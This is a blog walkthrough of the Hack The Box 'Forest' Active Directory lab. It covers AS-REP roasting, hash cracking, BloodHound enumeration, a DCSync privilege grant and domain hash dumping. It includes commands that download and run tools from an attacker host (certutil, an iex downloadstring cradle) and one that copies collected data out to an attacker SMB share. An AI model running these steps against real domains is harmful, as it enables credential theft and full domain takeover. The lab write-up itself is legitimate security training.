# :game_die: Htb Forest Ce4D06938A23

---

This is the Box on [Hack The Box Active Directory 101 Track](https://app.hackthebox.com/tracks/Active-Directory-101). Find the box [here](https://app.hackthebox.com/machines/212).

### Skill Learned

- ASREP Roasting

- Enumeration with Bloodhound

- DCSync Attack

## NMAP

IP: 10.10.10.161

```
nmap -sC -sV 10.10.10.161 -Pn -T5
```

*nmap scan*

The machine appears to be a Domain Controller for the HTB.LOCAL domain.

## Port 445 & 139

Let’s look into Port 445

Neither smbmap nor smbclient will allow me to list shares without a password:

*smbmap*

*smbclient*

We can try rcpclient. I’ll connect with null auth:

*rcpclient*

I can get a list of users with `enumdomusers`:

*enumdomusers*

I can list the groups too `enumdomgroups`:

*enumdomgroups*

I can also look at a group for its members. For example, the Domain Admins group has one member, rid 0x1f4:

```
querygroup 0x200
querygroupmem 0x200
```

*querygroup 0x200 and querygroupmem 0x200*

That’s the Administrator account:

```
queryuser 0x1f4
```

*queryuser 0x1f4*

FootHold / Shell

Shell as svc-alfresco

In Kerberoasting, typically it requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos pre-authentication” or *UF_DONT_REQUIRE_PREAUTH* set to true. AS-REP Roasting is an attack against Kerberos for these accounts. I have a list of accounts from my RPC enumeration above. I’ll start without the SM* or HealthMailbox* accounts:

*users.txt*

Now I can use the Impacket tool *GetNPUsers.py* to try to get a hash for each user, and I find one for the svc-alfresco account.

## Get anuragtaparia’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

svc-alfresco is a service account. Searching for alfresco online brings us to this [setup documentation](https://docs.alfresco.com/process-services/latest/config/authenticate/). According to this, the service needs Kerberos pre-authentication to be disabled. This means that we can request the encrypted TGT for this user. As the TGT contains material that is encrypted with the user’s NTLM hash, we can subject this to an offline brute-force attack, and attempt to get the password for svc-alfresco.

```
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

*GetNPU*

Now we will use hashcat for cracking hash:

```
hashcat -m 18200 svc-alfresco.kerb /home/anurag/Downloads/rockyou.txt --force
```

*hashcat*

Using this credential with evil-winrm and boom, we are in:

```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

*evil-winrm*

We found user.txt:

*user.txt*

## Privilege Escalation

Let’s use BloodHound to visualize the domain and look for privilege escalation paths.

With my shell, I’ll run Sharphound ([SharpHound v1.1.1](https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip)) to collect data for BloodHound.

Start neo4j and BloodHound on Kali and copy Sharphound.exe to the target box:

```
certutil -urlcache -f http://10.10.14.9/SharpHound.exe SharpHound.exe
```

*copying sharphound*

Once done, this will generate 2 files: a zip file and a bin file. Our task is to copy the zip file to our Kali machine so that we can feed it to our BloodHound tool.

*running sharphound*

To copy the zip file to our machine start smbserver

```
smbserver.py share . -smb2support -username anurag -password anurag
```

*copying file back to kali*

```
net use \\10.10.14.9\share /u:anurag anurag
copy 20240713055831_BloodHound.zip \\10.10.14.9\share
net use /d \\10.10.14.9\share
```

Upload the zip file in BloodHound. In BloodHound, on the top left side, you will see a search bar. Search for svc-alfresco in it. In the middle of the screen, you will be able to see svc-alfresco. Right-click on it and select “Mark user as owned”. Now in the query, select “Find shortest path to domain admins”.

One of the paths shows that the Exchange Windows Permissions group has WriteDacl privileges on the Domain. The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them DCSync privileges.

Create a user on the domain:

*net user anurag password /add /domain*

Add the user to the *Exchange Windows Permission* group:

*add a user to Exchange Windows Permission*

Give the user DCSync privileges. We’ll use PowerView ([PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)) for this. First download PowerView and set up a Python server in the directory it resides in:

```
iex(new-object net.webclient).downloadstring('http://10.10.14.9/PowerView.ps1')
$SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\anurag', $SecPass)
Add-ObjectACL -PrincipalIdentity anurag -Credential $Cred -Rights DCSync
```

*Giving user DCSync*

Now, the secretsdump script from Impacket can be run as anurag and used to reveal the NTLM hashes for all domain users:

*secertsdump.py*

The obtained Domain Admin hash can be used to login via psexec:

*psexec.py*

Found root.txt:

*root.txt*

---
